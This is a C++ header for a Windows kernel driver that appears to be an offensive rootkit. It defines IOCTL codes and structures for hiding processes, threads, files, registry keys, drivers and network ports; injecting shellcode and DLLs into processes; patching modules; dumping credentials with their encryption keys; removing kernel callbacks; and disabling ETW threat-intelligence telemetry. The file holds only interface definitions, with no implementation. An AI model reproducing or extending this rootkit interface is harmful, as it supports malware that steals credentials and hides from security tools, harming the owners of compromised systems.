#pragma once

// Definitions
#define CTL_CODE_COPY( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)

constexpr unsigned char METHOD_BUFFERED_COPY = 0;
constexpr unsigned char FILE_ANY_ACCESS_COPY = 0;
constexpr SIZE_T MAX_PATH_COPY = 260;

// ** IOCTLS **********************************************************************************************
constexpr unsigned long IOCTL_PROTECT_UNPROTECT_PROCESS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x800, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_CLEAR_PROCESSES = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x801, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_HIDE_UNHIDE_PROCESS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x802, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_ELEVATE_PROCESS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x803, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_SET_PROCESS_SIGNATURE_LEVEL = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x804, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_LIST_PROCESSES = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x805, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));

constexpr unsigned long IOCTL_PROTECT_UNPROTECT_THREAD = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x806, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_CLEAR_THREADS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x807, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_HIDE_UNHIDE_THREAD = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x808, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_LIST_THREADS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x809, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));

constexpr unsigned long IOCTL_PROTECT_UNPROTECT_FILE = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x80A, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_CLEAR_PROTECTED_FILES = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x80B, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_LIST_FILES = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x80C, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));

constexpr unsigned long IOCTL_PROTECT_HIDE_REGITEM = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x80D, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_UNPROTECT_UNHIDE_REGITEM = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x80E, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_CLEAR_REGITEMS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x80F, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_LIST_REGITEMS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x810, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));

constexpr unsigned long IOCTL_PATCH_MODULE = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x811, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_INJECT_SHELLCODE = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x812, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_INJECT_DLL = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x813, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_HIDE_RESTORE_MODULE = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x814, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_HIDE_UNHIDE_DRIVER = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x815, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_DUMP_CREDENTIALS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x816, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));

constexpr unsigned long IOCTL_LIST_OBCALLBACKS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x817, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_LIST_PSROUTINES = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x818, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_LIST_REGCALLBACKS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x819, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_REMOVE_RESTORE_CALLBACK = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81A, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_ENABLE_DISABLE_ETWTI = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81B, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));

constexpr unsigned long IOCTL_HIDE_UNHIDE_PORT = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81C, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_CLEAR_HIDDEN_PORTS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81D, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
constexpr unsigned long IOCTL_LIST_HIDDEN_PORTS = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81E, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));

constexpr unsigned long IOCTL_EXEC_SCRIPT = static_cast<unsigned long>(CTL_CODE_COPY(0x8000, 0x81F, METHOD_BUFFERED_COPY, FILE_ANY_ACCESS_COPY));
// *******************************************************************************************************

// IOCTL related definitions

constexpr SIZE_T REG_VALUE_LEN = 260;
constexpr SIZE_T REG_KEY_LEN = 255;
constexpr SIZE_T MAX_DRIVER_PATH = 256;

// Structs
enum CallbackType {
	ObProcessType,
	ObThreadType,
	PsCreateProcessTypeEx,
	PsCreateProcessType,
	PsCreateThreadType,
	PsCreateThreadTypeNonSystemThread,
	PsImageLoadType,
	CmRegistryType
};

struct IoctlKernelCallback {
	CallbackType Type;
	unsigned long long CallbackAddress;
	bool Remove;
};

template<typename CallbackListType>
struct IoctlCallbackList {
	CallbackType Type;
	SIZE_T Count;
	CallbackListType* Callbacks;
};

struct ObCallback {
	PVOID PreOperation;
	PVOID PostOperation;
	CHAR DriverName[MAX_DRIVER_PATH];
};

struct PsRoutine {
	unsigned long long CallbackAddress;
	CHAR DriverName[MAX_DRIVER_PATH];
};

struct CmCallback {
	unsigned long long CallbackAddress;
	unsigned long long Context;
	CHAR DriverName[MAX_DRIVER_PATH];
};

enum class FileType {
	Protected,
	All
};

struct IoctlFileItem {
	wchar_t* FilePath;
	bool Protect;
};

struct IoctlFileList {
	FileType Type;
	SIZE_T Count;
	wchar_t** Files;
};

struct KeyInformation {
	unsigned long Size;
	PVOID Data;
};

struct IoctlCredentials {
	UNICODE_STRING Username;
	UNICODE_STRING Domain;
	UNICODE_STRING EncryptedHash;
};

struct IoctlCredentialsInformation {
	SIZE_T Count;
	IoctlCredentials* Creds;
	KeyInformation DesKey;
	KeyInformation Iv;
};

enum class InjectionType {
	APCInjection,
	CreateThreadInjection
};

struct IoctlDllInfo {
	InjectionType Type;
	unsigned long Pid;
	CHAR DllPath[MAX_PATH_COPY];
};

struct IoctlShellcodeInfo {
	InjectionType Type;
	unsigned long Pid;
	SIZE_T ShellcodeSize;
	PVOID Shellcode;
	PVOID Parameter1;
	SIZE_T Parameter1Size;
	PVOID Parameter2;
	SIZE_T Parameter2Size;
	PVOID Parameter3;
	SIZE_T Parameter3Size;
};

struct IoctlPatchedModule {
	unsigned long Pid;
	PVOID Patch;
	SIZE_T PatchLength;
	CHAR* FunctionName;
	WCHAR* ModuleName;
};

struct IoctlHiddenModuleInfo {
	bool Hide;
	unsigned long Pid;
	WCHAR* ModuleName;
};

struct IoctlHiddenDriverInfo {
	WCHAR* DriverName;
	bool Hide;
};

enum class PortType {
	TCP,
	UDP,
	All
};

struct IoctlHiddenPort {
	bool Hide;
	bool Remote;
	PortType Type;
	unsigned short Port;
};

struct IoctlHiddenPortEntry {
	bool Remote;
	unsigned short Port;
};

struct IoctlHiddenPorts {
	IoctlHiddenPortEntry* Ports;
	SIZE_T Count;
	PortType Type;
};

enum class ProcessType {
	Protected,
	Hidden,
	All
};

struct IoctlProcessEntry {
	unsigned long Pid;
	bool Protect;
};

struct IoctlProcessSignature {
	unsigned long Pid;
	unsigned char SignerType;
	unsigned char SignatureSigner;
};

struct IoctlProcessList {
	ProcessType Type;
	SIZE_T Count;
	unsigned long* Processes;
};

enum class RegItemType {
	ProtectedKey = 0,
	ProtectedValue = 1,
	HiddenKey = 2,
	HiddenValue = 3,
	All
};

struct IoctlRegItem {
	RegItemType Type;
	WCHAR KeyPath[REG_KEY_LEN];
	WCHAR ValueName[REG_VALUE_LEN];
};

struct IoctlRegistryList {
	RegItemType Type;
	SIZE_T Count;
	IoctlRegItem* Items;
};

enum class ThreadType {
	Protected,
	Hidden,
	All
};

struct IoctlThreadEntry {
	unsigned long Tid;
	bool Protect;
};

struct IoctlThreadList {
	ThreadType Type;
	SIZE_T Count;
	unsigned long* Threads;
};